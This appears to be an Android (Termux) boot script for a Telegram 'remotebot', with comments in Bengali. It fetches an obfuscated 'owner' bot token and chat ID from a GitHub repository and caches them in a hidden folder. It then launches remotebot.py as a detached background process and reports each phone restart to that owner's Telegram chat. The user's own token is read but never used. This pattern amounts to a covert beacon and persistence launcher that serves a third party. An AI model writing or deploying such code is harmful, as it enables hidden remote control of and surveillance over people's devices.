#!/usr/bin/env python3
import os, sys, json, base64, hashlib, subprocess, datetime, socket, requests

BASE  = "/storage/emulated/0"
CACHE = os.path.join(BASE, ".botcache")

OWNER_ENC_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.enc"
OWNER_KEY_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.key"

def _d(enc, key):
    kb  = hashlib.sha256(key.encode()).digest()
    raw = base64.b64decode(enc.encode())
    return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()

def load_owner():
    try:
        os.makedirs(CACHE, exist_ok=True)
        enc = requests.get(OWNER_ENC_URL, timeout=15).text
        key_data = requests.get(OWNER_KEY_URL, timeout=15).text
        open(os.path.join(CACHE,".owner.enc"),"w").write(enc)
        open(os.path.join(CACHE,".owner.key"),"w").write(key_data)
        key = base64.b64decode(key_data.strip()).decode()
        data = json.loads(enc)
        return _d(data["t"], key), int(_d(data["c"], key))
    except:
        try:
            key = base64.b64decode(open(os.path.join(CACHE,".owner.key")).read().strip()).decode()
            data = json.loads(open(os.path.join(CACHE,".owner.enc")).read())
            return _d(data["t"], key), int(_d(data["c"], key))
        except:
            return None, None

def load_user():
    try:
        data = json.load(open(os.path.join(BASE,"user.config")))
        return data["bot_token"], int(data["chat_id"])
    except:
        return None, None

o_token, o_chat = load_owner()
u_token, u_chat = load_user()

if not o_token:
    open(os.path.join(BASE,"boot.log"),"w").write("Owner token load হয়নি!")
    sys.exit(1)

# remotebot.py চালু করো
log = open(os.path.join(BASE,"bot.log"),"w")
subprocess.Popen(
    ["python3", os.path.join(BASE,"remotebot.py")],
    stdout=log, stderr=log,
    stdin=subprocess.DEVNULL,
    start_new_session=True
)

# Notification
now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
hostname = socket.gethostname()
try:
    requests.post(
        f"https://api.telegram.org/bot{o_token}/sendMessage",
        data={"chat_id": o_chat, "text": f"🔄 <b>Phone Restarted!</b>\n\n🕐 {now}\n✅ Bot Auto Started!", "parse_mode": "HTML"},
        timeout=10
    )
except:
    pass

print("✅ Bot চালু হয়েছে!")
